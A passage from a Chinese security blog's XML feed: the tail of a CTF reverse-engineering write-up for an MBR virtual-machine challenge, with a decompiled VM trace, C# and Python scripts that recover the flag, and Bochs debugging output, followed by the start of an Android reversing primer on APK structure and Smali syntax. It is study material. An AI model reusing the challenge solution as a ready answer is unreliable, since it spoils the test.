buf[4]buf[4] = 126if buf[3] != 0:    pc = buf[4] # jmp 126buf[3] = 1buf[0] += buf[3]buf[1] += buf[3]buf[2] -= buf[3]buf[4] = 90if buf[2] != 0:    pc = buf[4] # jmp 90buf[3] = code[buf[0]] # (&#39;Read code, offset:&#39;, &#39;131&#39;)buf[4] = code[buf[1]] # (&#39;Read code, offset:&#39;, &#39;140&#39;)buf[3] -= buf[4]buf[4] = 126if buf[3] != 0:    pc = buf[4] # jmp 126buf[3] = 1buf[0] += buf[3]buf[1] += buf[3]buf[2] -= buf[3]buf[4] = 90if buf[2] != 0:    pc = buf[4] # jmp 90buf[3] = code[buf[0]] # (&#39;Read code, offset:&#39;, &#39;132&#39;)buf[4] = code[buf[1]] # (&#39;Read code, offset:&#39;, &#39;141&#39;)buf[3] -= buf[4]buf[4] = 126if buf[3] != 0:    pc = buf[4] # jmp 126buf[3] = 1buf[0] += buf[3]buf[1] += buf[3]buf[2] -= buf[3]buf[4] = 90if buf[2] != 0:    pc = buf[4] # jmp 90buf[3] = code[buf[0]] # (&#39;Read code, offset:&#39;, &#39;133&#39;)buf[4] = code[buf[1]] # (&#39;Read code, offset:&#39;, &#39;142&#39;)buf[3] -= buf[4]buf[4] = 126if buf[3] != 0:    pc = buf[4] # jmp 126buf[3] = 1buf[0] += buf[3]buf[1] += buf[3]buf[2] -= buf[3]buf[4] = 90if buf[2] != 0:    pc = buf[4] # jmp 90buf[3] = code[buf[0]] # (&#39;Read code, offset:&#39;, &#39;134&#39;)buf[4] = code[buf[1]] # (&#39;Read code, offset:&#39;, &#39;143&#39;)buf[3] -= buf[4]buf[4] = 126if buf[3] != 0:    pc = buf[4] # jmp 126buf[3] = 1buf[0] += buf[3]buf[1] += buf[3]buf[2] -= buf[3]buf[4] = 90if buf[2] != 0:    pc = buf[4] # jmp 90buf[3] = code[buf[0]] # (&#39;Read code, offset:&#39;, &#39;135&#39;)buf[4] = code[buf[1]] # (&#39;Read code, offset:&#39;, &#39;144&#39;)buf[3] -= buf[4]buf[4] = 126if buf[3] != 0:    pc = buf[4] # jmp 126buf[3] = 1buf[0] += buf[3]buf[1] += buf[3]buf[2] -= buf[3]buf[4] = 90if buf[2] != 0:    pc = buf[4] # jmp 90buf[3] = code[buf[0]] # (&#39;Read code, offset:&#39;, &#39;136&#39;)buf[4] = code[buf[1]] # (&#39;Read code, offset:&#39;, &#39;145&#39;)buf[3] -= buf[4]buf[4] = 126if buf[3] != 0:    pc = buf[4] # jmp 126buf[3] = 1buf[0] += buf[3]buf[1] += buf[3]buf[2] -= buf[3]buf[4] = 90if buf[2] != 0:    pc = buf[4] # jmp 90buf[3] = code[buf[0]] # (&#39;Read code, offset:&#39;, &#39;137&#39;)buf[4] = code[buf[1]] # (&#39;Read code, offset:&#39;, &#39;146&#39;)buf[3] -= buf[4]buf[4] = 126if buf[3] != 0:    pc = buf[4] # jmp 126buf[3] = 1buf[0] += buf[3]buf[1] += buf[3]buf[2] -= buf[3]buf[4] = 90if buf[2] != 0:    pc = buf[4] # jmp 90print &#39;right&#39;</code></pre><p>人脑逆向机简化一波代码，就是一个 9 次的循环异或，并在最后进行比较：</p><pre><code class="python">i = 129while True:    code[i] = code[i] ^ (code[i] &lt;&lt; 8) ^ (code[i] &lt;&lt; 16) ^ (code[i] &lt;&lt; 24) ^ code[i - 1] ^ (code[i - 1] &lt;&lt; 8) ^ (code[i - 1] &lt;&lt; 16) ^ (code[i - 1] &lt;&lt; 24)    i += 1    if i - 138 == 0:        breakfor i in range(9):    if code[138 + i] - code[129 + i] != 0:        print &#39;wrong&#39;        exit()print &#39;right&#39;</code></pre><p>这里已知正确的数据在计算后的结果，可以通过爆破来得到（爆破范围比较大，Python 会消耗很多时间，这里用 C#）：</p><pre><code class="c#">using System;namespace Solve {    class Program {        public static byte[] intToBytes(uint value) {            byte[] res = new byte[4];            res[3] = (byte) ((value &gt;&gt; 24) &amp; 0xFF);            res[2] = (byte) ((value &gt;&gt; 16) &amp; 0xFF);            res[1] = (byte) ((value &gt;&gt; 8) &amp; 0xFF);            res[0] = (byte) (value &amp; 0xFF);            return res;        }        public static string asciiToString(byte[] array) {            return Convert.ToString(System.Text.Encoding.ASCII.GetString(array));        }        static void Main(string[] args) {            var data = new uint[] {                0x61646238, 0x36353465, 0x6361352d, 0x31312d38, 0x612d3965, 0x2d316331, 0x39653838, 0x30386566, 0x66616566, 0x57635565, 0x06530401, 0x1f494949, 0x5157071f, 0x575f4357, 0x57435e57, 0x4357020a, 0x575e035e, 0x0f590000, 0x6e6f7277, 0x20202067, 0x00202020, 0x72726f63, 0x20746365, 0x20202020, 0x6c660020, 0x69206761, 0x6c662073, 0x597b6761, 0x5072756f, 0x68637461, 0x2020207d, 0x20202020, 0x20202020, 0x20202020, 0x20202020, 0x20202020, 0x20202020, 0xffffff00, 0xffffffff            };            var ans = new uint[data.Length];            var patch = new byte[data.Length * 4];            for(uint i = 0; i &lt; 9; i++) {                uint t = 0;                for(uint j = 0; j &lt;= 0x7FFFFFFF; j++) {                    t = j ^ (j &lt;&lt; 8) ^ (j &lt;&lt; 16) ^ (j &lt;&lt; 24);                    if(i &gt; 0) {                        t ^= ans[i - 1] ^ (ans[i - 1] &lt;&lt; 8) ^ (ans[i - 1] &lt;&lt; 16) ^ (ans[i - 1] &lt;&lt; 24);                    }                    if(t == data[i + 9]) { // 0x57635565                        ans[i] = j;                        patch[4 * i] = intToBytes(j)[0];                        patch[4 * i + 1] = intToBytes(j)[1];                        patch[4 * i + 2] = intToBytes(j)[2];                        patch[4 * i + 3] = intToBytes(j)[3];                        Console.WriteLine(&quot;0x{0:X8}&quot;, j);                        break;                    }                }            }            string flag = asciiToString(patch);            Console.WriteLine(flag);        }    }}</code></pre><p>当然在已知数据的情况下也可以直接逆回来：</p><pre><code class="python">#!/usr/bin/env pythondata = [0x57635565, 0x06530401, 0x1F494949, 0x5157071F, 0x575F4357, 0x57435E57, 0x4357020A, 0x575E035E, 0x0F590000, 0x00000000]flag = &#39;&#39;for i in range(9):    flag += libnum.n2s(data[i] ^ ((data[i] &lt;&lt; 8) &amp; 0xFFFFFFFF))[::-1]    data[i + 1] = data[i] ^ data[i + 1]print flag</code></pre><h1 id="bochs-调试"><a href="#bochs-调试" class="headerlink" title="bochs 调试"></a>bochs 调试</h1><p>这道题其实主要通过 bochs 进行动态调试来分析，下面附上动态调试的一些过程：</p><pre><code>&lt;bochs:1&gt; b 0x7c00&lt;bochs:2&gt; c00000004662i[BIOS  ] $Revision: 13073 $ $Date: 2017-02-16 22:43:52 +0100 (Do, 16. Feb 2017) $00000318050i[KBD   ] reset-disable command received00000320819i[BIOS  ] Starting rombios3200000321257i[BIOS  ] Shutdown flag 000000321840i[BIOS  ] ram_size=0x0200000000000322261i[BIOS  ] ram_end=32MB00000362829i[BIOS  ] Found 1 cpu(s)00000376413i[BIOS  ] bios_table_addr: 0x000f9cd8 end=0x000fcc0000000704208i[PCI   ] i440FX PMC write to PAM register 59 (TLB Flush)00001032137i[P2ISA ] PCI IRQ routing: PIRQA# set to 0x0b00001032156i[P2ISA ] PCI IRQ routing: PIRQB# set to 0x0900001032175i[P2ISA ] PCI IRQ routing: PIRQC# set to 0x0b00001032194i[P2ISA ] PCI IRQ routing: PIRQD# set to 0x0900001032204i[P2ISA ] write: ELCR2 = 0x0a00001032974i[BIOS  ] PIIX3/PIIX4 init: elcr=00 0a00001040697i[BIOS  ] PCI: bus=0 devfn=0x00: vendor_id=0x8086 device_id=0x1237 class=0x060000001042976i[BIOS  ] PCI: bus=0 devfn=0x08: vendor_id=0x8086 device_id=0x7000 class=0x060100001045094i[BIOS  ] PCI: bus=0 devfn=0x09: vendor_id=0x8086 device_id=0x7010 class=0x010100001045323i[PIDE  ] new BM-DMA address: 0xc00000001045939i[BIOS  ] region 4: 0x0000c00000001047953i[BIOS  ] PCI: bus=0 devfn=0x0a: vendor_id=0x8086 device_id=0x7020 class=0x0c0300001048157i[UHCI  ] new base address: 0xc02000001048773i[BIOS  ] region 4: 0x0000c02000001048901i[UHCI  ] new irq line = 900001050796i[BIOS  ] PCI: bus=0 devfn=0x0b: vendor_id=0x8086 device_id=0x7113 class=0x068000001051028i[ACPI  ] new irq line = 1100001051040i[ACPI  ] new irq line = 900001051065i[ACPI  ] new PM base address: 0xb00000001051079i[ACPI  ] new SM base address: 0xb10000001051107i[PCI   ] setting SMRAM control register to 0x4a00001215200i[CPU0  ] Enter to System Management Mode00001215200i[CPU0  ] enter_system_management_mode: temporary disable VMX while in SMM mode00001215210i[CPU0  ] RSM: Resuming from System Management Mode00001379231i[PCI   ] setting SMRAM control register to 0x0a00001394138i[BIOS  ] MP table addr=0x000f9db0 MPC table addr=0x000f9ce0 size=0xc800001395960i[BIOS  ] SMBIOS table addr=0x000f9dc000001398141i[BIOS  ] ACPI tables: RSDP addr=0x000f9ee0 ACPI DATA addr=0x01ff0000 size=0xf7200001401353i[BIOS  ] Firmware waking vector 0x1ff00cc00001403148i[PCI   ] i440FX PMC write to PAM register 59 (TLB Flush)00001403871i[BIOS  ] bios_table_cur_addr: 0x000f9f0400001531488i[VBIOS ] VGABios $Id: vgabios.c,v 1.76 2013/02/10 08:07:03 vruppert Exp $00001531559i[BXVGA ] VBE known Display Interface b0c000001531591i[BXVGA ] VBE known Display Interface b0c500001534516i[VBIOS ] VBE Bios $Id: vbe.c,v 1.65 2014/07/08 18:02:25 vruppert Exp $00014040189i[BIOS  ] Booting from 0000:7c00(0) Breakpoint 1, 0x0000000000007c00 in ?? ()Next at t=14040244(0) [0x000000007c00] 0000:7c00 (unk. ctxt): jmpf 0x07c0:0005          ; ea0500c007</code></pre><p>可以用 <code>show mode</code> 命令来显示实模式向保护模式的转换：</p><pre><code>&lt;bochs:3&gt; show modeshow mode switch: ONshow mask is: mode</code></pre><p>利用 <code>u</code> 命令来查看汇编代码，这里是实模式的部分：</p><pre><code>&lt;bochs:7&gt; u/40 0x7c0000007c00: (                    ): jmpf 0x07c0:0005          ; ea0500c00700007c05: (                    ): mov ax, cs                ; 8cc800007c07: (                    ): mov ds, ax                ; 8ed800007c09: (                    ): mov ss, ax                ; 8ed000007c0b: (                    ): mov sp, 0x0400            ; bc000400007c0e: (                    ): cld                       ; fc00007c0f: (                    ): mov ax, 0x0003            ; b8030000007c12: (                    ): int 0x10                  ; cd1000007c14: (                    ): mov dx, 0x0000            ; ba000000007c17: (                    ): mov cx, 0x0002            ; b9020000007c1a: (                    ): mov ax, 0x1000            ; b8001000007c1d: (                    ): mov es, ax                ; 8ec000007c1f: (                    ): xor bx, bx                ; 31db00007c21: (                    ): mov ax, 0x0228            ; b8280200007c24: (                    ): int 0x13                  ; cd1300007c26: (                    ): jnb .+2                   ; 730200007c28: (                    ): jmp .-2                   ; ebfe00007c2a: (                    ): cli                       ; fa00007c2b: (                    ): mov ax, 0x1000            ; b8001000007c2e: (                    ): mov ds, ax                ; 8ed800007c30: (                    ): xor ax, ax                ; 31c000007c32: (                    ): mov es, ax                ; 8ec000007c34: (                    ): mov cx, 0x2000            ; b9002000007c37: (                    ): sub si, si                ; 29f600007c39: (                    ): sub di, di                ; 29ff00007c3b: (                    ): rep movsb byte ptr es:[di], byte ptr ds:[si] ; f3a400007c3d: (                    ): mov ax, 0x07c0            ; b8c00700007c40: (                    ): mov ds, ax                ; 8ed800007c42: (                    ): lidt ds:0x006f            ; 0f011e6f0000007c47: (                    ): lgdt ds:0x0075            ; 0f0116750000007c4c: (                    ): mov ax, 0x0001            ; b8010000007c4f: (                    ): lmsw ax                   ; 0f01f000007c52: (                    ): jmpf 0x0008:0000          ; ea00000800</code></pre><p>在指令 <code>lmsw ax</code> 处看到实模式向保护模式的转换：</p><pre><code>&lt;bochs:39&gt; nNext at t=15885325(0) [0x000000007c4f] 07c0:004f (unk. ctxt): lmsw ax                   ; 0f01f0&lt;bochs:40&gt;00015885326: switched from &#39;real mode&#39; to &#39;protected mode&#39;Next at t=15885326(0) [0x000000007c52] 07c0:0000000000000052 (unk. ctxt): jmpf 0x0008:0000          ; ea00000800</code></pre><p>保护模式的前一段部分：</p><pre><code>&lt;bochs:42&gt; u/20 0x0000000000: (                    ): mov eax, 0x00000010       ; b81000000000000005: (                    ): mov ds, ax                ; 8ed800000007: (                    ): lss esp, ds:0x00000b5c    ; 0fb2255c0b00000000000e: (                    ): call .+120                ; e87800000000000013: (                    ): call .+107                ; e86b00000000000018: (                    ): mov eax, 0x00000010       ; b8100000000000001d: (                    ): mov ds, ax                ; 8ed80000001f: (                    ): mov es, ax                ; 8ec000000021: (                    ): mov fs, ax                ; 8ee000000023: (                    ): mov gs, ax                ; 8ee800000025: (                    ): lss esp, ds:0x00000b5c    ; 0fb2255c0b00000000002c: (                    ): xor ebx, ebx              ; 31db</code></pre><p>IDTR 的初始化：</p><pre><code>&lt;bochs:39&gt; u/20 0x8b0000008b: (                    ): mov edx, 0x000000fc       ; bafc00000000000090: (                    ): mov eax, 0x00080000       ; b80000080000000095: (                    ): mov ax, dx                ; 6689d000000098: (                    ): mov dx, 0x8e00            ; 66ba008e0000009c: (                    ): lea edi, dword ptr ds:0x00000128 ; 8d3d28010000000000a2: (                    ): mov ecx, 0x00000100       ; b900010000000000a7: (                    ): mov dword ptr ds:[edi], eax ; 8907000000a9: (                    ): mov dword ptr ds:[edi+4], edx ; 895704000000ac: (                    ): add edi, 0x00000008       ; 83c708000000af: (                    ): dec ecx                   ; 49000000b0: (                    ): jnz .-11                  ; 75f5000000b2: (                    ): lidt ds:0x0000011c        ; 0f011d1c010000000000b9: (                    ): ret                       ; c3</code></pre><p>GDTR 的初始化：</p><pre><code>&lt;bochs:68&gt; u/10 0x8300000083: (                    ): lgdt ds:0x00000122        ; 0f0115220100000000008a: (                    ): ret                       ; c3</code></pre><p>用 <code>sreg</code> 命令可以看到 GDTR 和 IDTR 寄存器被初始化了：</p><pre><code>&lt;bochs:75&gt; sreges:0x0000, dh=0x00009300, dl=0x0000ffff, valid=7    Data segment, base=0x00000000, limit=0x0000ffff, Read/Write, Accessedcs:0x0008, dh=0x00c09b00, dl=0x000007ff, valid=1    Code segment, base=0x00000000, limit=0x007fffff, Execute/Read, Non-Conforming, Accessed, 32-bitss:0x0010, dh=0x00c09300, dl=0x000007ff, valid=7    Data segment, base=0x00000000, limit=0x007fffff, Read/Write, Accessedds:0x0010, dh=0x00c09300, dl=0x000007ff, valid=7    Data segment, base=0x00000000, limit=0x007fffff, Read/Write, Accessedfs:0x0000, dh=0x00009300, dl=0x0000ffff, valid=1    Data segment, base=0x00000000, limit=0x0000ffff, Read/Write, Accessedgs:0x0000, dh=0x00009300, dl=0x0000ffff, valid=1    Data segment, base=0x00000000, limit=0x0000ffff, Read/Write, Accessedldtr:0x0000, dh=0x00008200, dl=0x0000ffff, valid=1tr:0x0000, dh=0x00008b00, dl=0x0000ffff, valid=1gdtr:base=0x0000000000000928, limit=0x1fidtr:base=0x0000000000000128, limit=0x7ff</code></pre><p>最后是虚拟机指令部分：</p><pre><code>&lt;bochs:43&gt; u/110 0xb7c00000b7c: (                    ): lea ecx, dword ptr ds:[ecx*4+2916] ; 8d0c8d640b000000000b83: (                    ): mov dword ptr ds:[ecx], eax ; 890100000b85: (                    ): jmp .+366                 ; e96e01000000000b8a: (                    ): lea eax, dword ptr ds:[eax*4+2916] ; 8d0485640b000000000b91: (                    ): mov eax, dword ptr ds:[eax] ; 8b0000000b93: (                    ): lea ecx, dword ptr ds:[ecx*4+2916] ; 8d0c8d640b000000000b9a: (                    ): mov dword ptr ds:[ecx], eax ; 890100000b9c: (                    ): jmp .+343                 ; e95701000000000ba1: (                    ): lea eax, dword ptr ds:[eax*4+2916] ; 8d0485640b000000000ba8: (                    ): mov eax, dword ptr ds:[eax] ; 8b0000000baa: (                    ): lea ecx, dword ptr ds:[ecx*4+2916] ; 8d0c8d640b000000000bb1: (                    ): lea eax, dword ptr ds:[eax*4+3400] ; 8d0485480d000000000bb8: (                    ): mov eax, dword ptr ds:[eax] ; 8b0000000bba: (                    ): mov dword ptr ds:[ecx], eax ; 890100000bbc: (                    ): jmp .+311                 ; e93701000000000bc1: (                    ): lea eax, dword ptr ds:[eax*4+2916] ; 8d0485640b000000000bc8: (                    ): mov eax, dword ptr ds:[eax] ; 8b0000000bca: (                    ): lea ecx, dword ptr ds:[ecx*4+2916] ; 8d0c8d640b000000000bd1: (                    ): mov ecx, dword ptr ds:[ecx] ; 8b0900000bd3: (                    ): lea ecx, dword ptr ds:[ecx*4+3400] ; 8d0c8d480d000000000bda: (                    ): mov dword ptr ds:[ecx], eax ; 890100000bdc: (                    ): jmp .+279                 ; e91701000000000be1: (                    ): lea eax, dword ptr ds:[eax*4+2916] ; 8d0485640b000000000be8: (                    ): mov edx, dword ptr ds:[eax] ; 8b1000000bea: (                    ): lea ecx, dword ptr ds:[ecx*4+2916] ; 8d0c8d640b000000000bf1: (                    ): mov eax, dword ptr ds:[ecx] ; 8b0100000bf3: (                    ): add eax, edx              ; 01d000000bf5: (                    ): mov dword ptr ds:[ecx], eax ; 890100000bf7: (                    ): jmp .+252                 ; e9fc00000000000bfc: (                    ): lea eax, dword ptr ds:[eax*4+2916] ; 8d0485640b000000000c03: (                    ): mov edx, dword ptr ds:[eax] ; 8b1000000c05: (                    ): lea ecx, dword ptr ds:[ecx*4+2916] ; 8d0c8d640b000000000c0c: (                    ): mov eax, dword ptr ds:[ecx] ; 8b0100000c0e: (                    ): sub eax, edx              ; 29d000000c10: (                    ): mov dword ptr ds:[ecx], eax ; 890100000c12: (                    ): jmp .+225                 ; e9e100000000000c17: (                    ): lea eax, dword ptr ds:[eax*4+2916] ; 8d0485640b000000000c1e: (                    ): mov edx, dword ptr ds:[eax] ; 8b1000000c20: (                    ): lea ecx, dword ptr ds:[ecx*4+2916] ; 8d0c8d640b000000000c27: (                    ): mov eax, dword ptr ds:[ecx] ; 8b0100000c29: (                    ): xor eax, edx              ; 31d000000c2b: (                    ): mov dword ptr ds:[ecx], eax ; 890100000c2d: (                    ): jmp .+198                 ; e9c600000000000c32: (                    ): lea eax, dword ptr ds:[eax*4+2916] ; 8d0485640b000000000c39: (                    ): mov eax, dword ptr ds:[eax] ; 8b0000000c3b: (                    ): lea edx, dword ptr ds:[ecx*4+2916] ; 8d148d640b000000000c42: (                    ): mov cl, al                ; 88c100000c44: (                    ): mov eax, dword ptr ds:[edx] ; 8b0200000c46: (                    ): shl eax, cl               ; d3e000000c48: (                    ): mov dword ptr ds:[edx], eax ; 890200000c4a: (                    ): jmp .+169                 ; e9a900000000000c4f: (                    ): lea eax, dword ptr ds:[eax*4+2916] ; 8d0485640b000000000c56: (                    ): mov eax, dword ptr ds:[eax] ; 8b0000000c58: (                    ): lea edx, dword ptr ds:[ecx*4+2916] ; 8d148d640b000000000c5f: (                    ): mov cl, al                ; 88c100000c61: (                    ): mov eax, dword ptr ds:[edx] ; 8b0200000c63: (                    ): shr eax, cl               ; d3e800000c65: (                    ): mov dword ptr ds:[edx], eax ; 890200000c67: (                    ): jmp .+140                 ; e98c00000000000c6c: (                    ): lea eax, dword ptr ds:[eax*4+2916] ; 8d0485640b000000000c73: (                    ): mov eax, dword ptr ds:[eax] ; 8b0000000c75: (                    ): lea ecx, dword ptr ds:[ecx*4+2916] ; 8d0c8d640b000000000c7c: (                    ): mov edx, dword ptr ds:[ecx] ; 8b1100000c7e: (                    ): and eax, edx              ; 21d000000c80: (                    ): mov dword ptr ds:[ecx], eax ; 890100000c82: (                    ): jmp .+116                 ; eb7400000c84: (                    ): lea eax, dword ptr ds:[ecx*4+2916] ; 8d048d640b000000000c8b: (                    ): mov eax, dword ptr ds:[eax] ; 8b0000000c8d: (                    ): lea ecx, dword ptr ds:0x00000b78 ; 8d0d780b000000000c93: (                    ): mov dword ptr ds:[ecx], eax ; 890100000c95: (                    ): iret                      ; cf00000c96: (                    ): lea eax, dword ptr ds:[eax*4+2916] ; 8d0485640b000000000c9d: (                    ): mov eax, dword ptr ds:[eax] ; 8b0000000c9f: (                    ): test eax, eax             ; 85c000000ca1: (                    ): jnz .+85                  ; 755500000ca3: (                    ): lea eax, dword ptr ds:[ecx*4+2916] ; 8d048d640b000000000caa: (                    ): mov eax, dword ptr ds:[eax] ; 8b0000000cac: (                    ): lea ecx, dword ptr ds:0x00000b78 ; 8d0d780b000000000cb2: (                    ): mov dword ptr ds:[ecx], eax ; 890100000cb4: (                    ): iret                      ; cf00000cb5: (                    ): lea eax, dword ptr ds:[eax*4+2916] ; 8d0485640b000000000cbc: (                    ): mov eax, dword ptr ds:[eax] ; 8b0000000cbe: (                    ): test eax, eax             ; 85c000000cc0: (                    ): jz .+54                   ; 743600000cc2: (                    ): lea eax, dword ptr ds:[ecx*4+2916] ; 8d048d640b000000000cc9: (                    ): mov eax, dword ptr ds:[eax] ; 8b0000000ccb: (                    ): lea ecx, dword ptr ds:0x00000b78 ; 8d0d780b000000000cd1: (                    ): mov dword ptr ds:[ecx], eax ; 890100000cd3: (                    ): iret                      ; cf00000cd4: (                    ): lea eax, dword ptr ds:0x00000f94 ; 8d05940f000000000cda: (                    ): call .-3061               ; e80bf4ffff00000cdf: (                    ): hlt                       ; f400000ce0: (                    ): lea eax, dword ptr ds:0x00000fa0 ; 8d05a00f000000000ce6: (                    ): call .-3073               ; e8fff3ffff00000ceb: (                    ): lea eax, dword ptr ds:0x00000fae ; 8d05ae0f000000000cf1: (                    ): call .-3084               ; e8f4f3ffff00000cf6: (                    ): hlt                       ; f400000cf7: (                    ): hlt                       ; f400000cf8: (                    ): lea ecx, dword ptr ds:0x00000b78 ; 8d0d780b000000000cfe: (                    ): mov eax, dword ptr ds:[ecx] ; 8b0100000d00: (                    ): add eax, 0x00000003       ; 83c00300000d03: (                    ): mov dword ptr ds:[ecx], eax ; 890100000d05: (                    ): iret                      ; cf</code></pre><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://www.52pojie.cn/thread-936377-1-1.html" target="_blank" rel="noopener">https://www.52pojie.cn/thread-936377-1-1.html</a><br><a href="https://blog.csdn.net/ice__snow/article/details/50654629" target="_blank" rel="noopener">https://blog.csdn.net/ice__snow/article/details/50654629</a><br><a href="https://blog.51cto.com/4201689/1420063" target="_blank" rel="noopener">https://blog.51cto.com/4201689/1420063</a><br><a href="https://www.cnblogs.com/playmak3r/p/12079833.html" target="_blank" rel="noopener">https://www.cnblogs.com/playmak3r/p/12079833.html</a><br><a href="https://blog.qrzbing.cn/2019/04/27/CISCN2019-strange-int/" target="_blank" rel="noopener">https://blog.qrzbing.cn/2019/04/27/CISCN2019-strange-int/</a><br><a href="http://imushan.com/2018/07/11/os/Bochs%E5%AD%A6%E4%B9%A0-%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE%E7%AF%87/" target="_blank" rel="noopener">http://imushan.com/2018/07/11/os/Bochs%E5%AD%A6%E4%B9%A0-%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE%E7%AF%87/</a><br><a href="https://www.cnblogs.com/mlzrq/p/10223079.html#%E4%BD%BF%E7%94%A8bochs%E8%B0%83%E8%AF%95" target="_blank" rel="noopener">https://www.cnblogs.com/mlzrq/p/10223079.html#%E4%BD%BF%E7%94%A8bochs%E8%B0%83%E8%AF%95</a><br><a href="https://mrh1s.top/posts/d2cf12e4/" target="_blank" rel="noopener">https://mrh1s.top/posts/d2cf12e4/</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;一道 MBR 虚拟机的题目，同时也熟悉了使用 bochs 对 MBR 的调试。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="re" scheme="blog.b3ale.cn/tags/re/"/>
    
      <category term="ctf" scheme="blog.b3ale.cn/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>Android逆向入门（一）</title>
    <link href="blog.b3ale.cn/2020/01/16/Android%E9%80%86%E5%90%91%E5%85%A5%E9%97%A8%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <id>blog.b3ale.cn/2020/01/16/Android%E9%80%86%E5%90%91%E5%85%A5%E9%97%A8%EF%BC%88%E4%B8%80%EF%BC%89/</id>
    <published>2020-01-16T06:41:48.000Z</published>
    <updated>2020-03-20T02:18:38.568Z</updated>
    
    <content type="html"><![CDATA[<p>开始学习安卓。</p><a id="more"></a><h1 id="APK-的组成"><a href="#APK-的组成" class="headerlink" title="APK 的组成"></a>APK 的组成</h1><ul><li>asset 文件夹<ul><li>资源目录，不需要生成索引，在 Java 代码中需要用 AssetManager 来访问</li></ul></li><li>lib 文件夹<ul><li>so 库存放位置，一般由 NDK 编译得到，常见于使用游戏引擎或 JNI native 调用的工程中</li></ul></li><li>META-INF 文件夹<ul><li>存放工程的一些属性文件，例如 Manifest.MF</li></ul></li><li>res 文件夹<ul><li>资源目录，在编译时自动生成索引文件（R.java），在 Java 代码中用 R.xxx.yyy 来引用</li></ul></li><li>AndroidManifest.xml<ul><li>Android 工程的基础配置属性文件（描述 Android 应用的信息，包括类名、组件名等）</li></ul></li><li>classes.dex<ul><li>Java 代码编译得到的 Dalvik VM 能直接执行的文件</li></ul></li><li>resources.arsc<ul><li>对 res 目录下资源的一个索引文件，保存了原工程中 string.xml 等文件内容</li></ul></li><li>其他文件夹</li></ul><p>一般来说，除了音频和视频资源（需要放在 raw 或 asset 下），使用 Java 开发的 Android 工程使用到的资源文件都会放在 res 下；使用 C++游戏引擎（或使用 Lua Unity3D 等）的资源文件均需要放在 asset 下。</p><h1 id="Dalvik-字节码"><a href="#Dalvik-字节码" class="headerlink" title="Dalvik 字节码"></a>Dalvik 字节码</h1><p>Dalvik 是谷歌专门为 Android 操作系统设计的一个虚拟机，经过深度的优化。虽然 Android 上的程序是使用 Java 来开发的，但是 Dalvik 和标准的 Java 虚拟机 JVM 还是两回事。Dalvik VM 是基于寄存器的，而 JVM 是基于栈的；Dalvik 有专属的文件执行格式 dex（Dalvik Executable），而 JVM 则执行的是 Java 字节码。Dalvik VM 比 JVM 速度更快，占用空间更少。</p><h1 id="Smali-文件结构"><a href="#Smali-文件结构" class="headerlink" title="Smali 文件结构"></a>Smali 文件结构</h1><p>Smali、Baksmali 分别是指 Android 系统里的 Dalvik 虚拟机所使用的一种 dex 格式文件的汇编器、反汇编器。其语法是一种宽松式的 Jasmin/Dedexer 语法，而且它实现了 dex 格式所有功能（注解、调试信息、线路信息等）。</p><p>当我们对 APK 文件进行反编译后，便会生成此类文件。其中在 Dalvik 字节码中，寄存器都是 32 位的，能够支持任何类型，64 位类型（Long/Double）用 2 个寄存器表示；Dalvik 字节码有两种类型：原始类型、引用类型（包括对象和数组）。</p><h2 id="头部定义"><a href="#头部定义" class="headerlink" title="头部定义"></a>头部定义</h2><ul><li><code>.class</code></li><li><code>.super</code></li><li><code>.source</code></li></ul><h2 id="域定义"><a href="#域定义" class="headerlink" title="域定义"></a>域定义</h2><ul><li><code>.field public</code></li><li><code>.field static</code></li><li><code>.field private</code></li><li>…</li></ul><h2 id="函数定义"><a href="#函数定义" class="headerlink" title="函数定义"></a>函数定义</h2><h3 id="Smali-函数（使用-P-V-寄存器）"><a href="#Smali-函数（使用-P-V-寄存器）" class="headerlink" title="Smali 函数（使用 P-V 寄存器）"></a>Smali 函数（使用 P-V 寄存器）</h3><p>在 smali 里的所有操作都必须经过寄存器来进行：本地寄存器用 v 开头、数字结尾的符号来表示，如 v0、v1、v2 等；参数寄存器则使用 p 开头、数字结尾的符号来表示，如 p0、p1、p2 等。特别注意的是，p0 不一定是函数中的第一个参数，在非 static 函数中，p0 代指 this，p1 表示函数的第一个参数，p2 代表函数中的第二个参数；而在 static 函数中 p0 才对应第一个参数（因为 Java 的 static 方法中没有 this 方法）。</p><pre><code class="smali">.method 访问修饰符 函数名 函数签名    .locals n # 使用 n 个寄存器，即 v0~v(n-1)    .param p1, &quot;savedInstanceState&quot; # Landroid/os/Bundle # 注释    ... # 函数实现    return-xxx # 返回.end method</code></pre><h3 id="函数调用"><a href="#函数调用" class="headerlink" title="函数调用"></a>函数调用</h3><p>参数通过寄存器传递（Pn、Vn）</p><pre><code class="smali">Invoke{参数}, 方法名</code></pre><h2 id="Smali-字段描述符"><a href="#Smali-字段描述符" class="headerlink" title="Smali 字段描述符"></a>Smali 字段描述符</h2><table><thead><tr><th style="text-align:center">Java type</th><th style="text-align:center">Type descriptor</th></tr></thead><tbody><tr><td style="text-align:center"><code>void</code></td><td style="text-align:center"><code>V</code></td></tr><tr><td style="text-align:center"><code>boolean</code></td><td style="text-align:center"><code>Z</code></td></tr><tr><td style="text-align:center"><code>char</code></td><td style="text-align:center"><code>C</code></td></tr><tr><td style="text-align:center"><code>byte</code></td><td style="text-align:center"><code>B</code></td></tr><tr><td style="text-align:center"><code>short</code></td><td style="text-align:center"><code>S</code></td></tr><tr><td style="text-align:center"><code>int</code></td><td style="text-align:center"><code>I</code></td></tr><tr><td style="text-align:center"><code>float</code></td><td style="text-align:center"><code>F</code></td></tr><tr><td style="text-align:center"><code>long</code></td><td style="text-align:center"><code>J</code></td></tr><tr><td style="text-align:center"><code>double</code></td><td style="text-align:center"><code>D</code></td></tr><tr><td style="text-align:center"><code>Object</code></td><td style="text-align:center"><code>Ljava/lang/Object;</code></td></tr><tr><td style="text-align:center"><code>int[]</code></td><td style="text-align:center"><code>[I</code></td></tr><tr><td style="text-align:center"><code>byte[]</code></td><td style="text-align:center"><code>[B</code></td></tr><tr><td style="text-align:center"><code>Object[][]</code></td><td style="text-align:center"><code>[[Ljava/lang/Object;</code></td></tr></tbody></table><h2 id="Smali-基本语法"><a href="#Smali-基本语法" class="headerlink" title="Smali 基本语法"></a>Smali 基本语法</h2><table><thead><tr><th style="text-align:center">Keyword descriptor</th><th 